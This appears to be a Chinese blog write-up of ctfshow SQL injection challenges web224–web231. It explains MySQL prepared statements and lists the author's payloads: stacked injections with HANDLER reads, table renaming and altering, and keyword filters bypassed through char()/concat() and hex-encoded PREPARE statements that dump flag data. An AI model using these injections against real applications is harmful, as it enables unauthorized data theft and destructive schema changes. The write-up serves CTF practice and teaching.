<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215023841.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408215023841"></p>

<p>显然可以盲注</p>
<p>数字被禁了可以使用true绕过</p>
<h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220113624.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408220113624"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220136403.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408220136403"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220153265.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408220153265"></p>

<p>重置成admin admin登录一下</p>
<h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h2 id="堆叠注入-handler读数据"><a href="#堆叠注入-handler读数据" class="headerlink" title="堆叠注入 handler读数据"></a>堆叠注入 handler读数据</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221302428.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408221302428"></p>

<p>没有过滤show</p>
<pre><code>/api/?username=1&#39;;show databases;&amp;page=1&amp;limit=10
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221705966.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408221705966"></p>

<pre><code>/api/?username=1&#39;;show tables;&amp;page=1&amp;limit=10
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221725973.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408221725973"></p>

<pre><code>/api/?username=1&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;handler ctfshow_flagasa close;&amp;page=1&amp;limit=10
</code></pre>
<p>预处理</p>
<pre><code>/api/?username=1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39; database()&#39;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10
</code></pre>
<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>mysql将prepare execute deallocate统称为 PREPARE STATEMENT.</p>
<pre><code>PREPARE name from &#39;[my sql sequece]&#39;;    #预定义sql语句
EXECUTE name;                         #执行预定义的sql语句
(DEALLOCATE || DROP) PREPARE name;         #珊瑚预定义sql语句     
</code></pre>
<p>字符串定义预处理</p>
<pre><code>PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;
ET @a = 3;
SET @b = 4;
EXECUTE stmt1 USING @a, @b;
</code></pre>
<p>变量定义预处理sql</p>
<pre><code>SET @s = &quot;SELECT SQRT(POW(?,2) + POW (?,2)) AS hypotenuse&quot;;
PREPARE stmt2 FROM @s;
SET @c = 6;
ET @d = 8;
EXECUTE stmt2 USING @c,@d;
DEALLOCATE PREPARE stmt2;
</code></pre>
<h3 id="常规堆叠注入"><a href="#常规堆叠注入" class="headerlink" title="常规堆叠注入"></a>常规堆叠注入</h3><p>习惯扫目录,没扫到</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151506062.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315150640013"></p>

<p>输入单引号,报错得出数据库mariadb </p>
<pre><code>1&#39; or 1=1#回显正常
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151507620.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315150758543"></p>

<pre><code>1&#39; order by 3#报错
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510055.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151004003"></p>

<pre><code>1&#39; order by 2#正常
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510359.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151033307"></p>

<pre><code>-1&#39; union select 1,2#发现有过滤
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151511268.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151126218"></p>

<p>大小写也绕不过</p>
<p>那么只能堆叠注入了</p>
<pre><code>1&#39;;show databases;#
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151513103.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151331036"></p>

<pre><code>11&#39;;show tables;#
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151514104.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151416056"></p>

<p>这里查看一个flag在那个字段里</p>
<pre><code>1&#39;;desc `1919810931114514`;#
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151516959.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151658903"></p>

<p>查一下下一个</p>
<pre><code>1&#39;;desc `words`;# 这里也可以不加`` 
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151519393.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315151902329"></p>

<p>那么这里面的id就有可能是我们查询时输入的值了,他的查询语句就可能是</p>
<pre><code>select id,data from words where id=&#39;&#39;
</code></pre>
<p>如果是这样的话,我们就可以将这里的words替换成1919810931114514将flag替换成id从而实现获取数据.那么可以将1919810931114514改名为words,在这之前需要先将words改下名,改成别的如word1.将flag改成data.但是在1919810931114514并没有id这个列名,那么我们可以给他添加一组id.</p>
<pre><code>1&#39;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key; alter table words change flag data varchar(100);#
</code></pre>
<p>接着才查询1</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151529964.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220315152912904"></p>

<h3 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h3><p>用法</p>
<pre><code>SER @tn = &#39;hahaha&#39;;                     #存储表名
SET @sql =concat(&#39;select * from &#39;,@tn);    #存储sql语句
PREPARE name from @sql;                 #预处理sql语句
EXECUTE name;                             #执行预定义sql语句
(DEALLOCATE || DROP) PREPARE sqla;         #删除预定义sql
</code></pre>
<p>本题即可利用char()函数将select的ascii码转换成select字符串,接着利用concat()函数进行拼接得到select查询语句从而绕过过滤.或者直接使用concat()函数拼接select来绕过</p>
<pre><code>char(115,101,108,101,99,116)等价于select&#39;
</code></pre>
<pre><code class="sql">1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE st from @sqli;EXECUTE st;#
</code></pre>
<p>或者</p>
<pre><code class="sql">1&#39;;PREPARE st from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE st;#
</code></pre>
<pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39; database()&#39;);PREPARE st from @sqli;EXECUTE st;
</code></pre>
<pre><code>/api/?username=1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39; database()&#39;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><h2 id="16进制预处理堆叠注入"><a href="#16进制预处理堆叠注入" class="headerlink" title="16进制预处理堆叠注入"></a>16进制预处理堆叠注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101024519.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409101024519"></p>

<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10
</code></pre>
<p>记得十六进制前面加0x哦</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101420720.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409101420720"></p>

<p>字段名</p>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;execute s;&amp;page=1&amp;limit=10
</code></pre>
<p>数据</p>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute s;&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101938137.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409101938137"></p>

<p>这道题考点其实是查看MySQL的存储过程.看看网上这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a>.我们去查information_schema.routines表</p>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute s;&amp;page=1&amp;limit=10
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102115511.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409102115511"></p>

<h1 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h1><p>和226差不多</p>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102337468.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409102337468"></p>

<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c61676173616127;execute s;&amp;page=1&amp;limit=10
</code></pre>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;execute s;&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102757765.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409102757765"></p>

<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10
</code></pre>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727;execute s;&amp;page=1&amp;limit=10
</code></pre>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c6167617362612066726f6d20666c6167;execute s;&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103050744.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409103050744"></p>

<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10
</code></pre>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c6167616162627827;execute s;&amp;page=1&amp;limit=10
</code></pre>
<pre><code>/api/?username=1&#39;;prepare s from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;execute s;&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h2 id="updata注入"><a href="#updata注入" class="headerlink" title="updata注入"></a>updata注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103315126.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409103315126"></p>

<pre><code>update ctfshow_user set pass = &#39;&#123;$password&#125;&#39; where username = &#39;&#123;$username&#125;&#39;;
</code></pre>
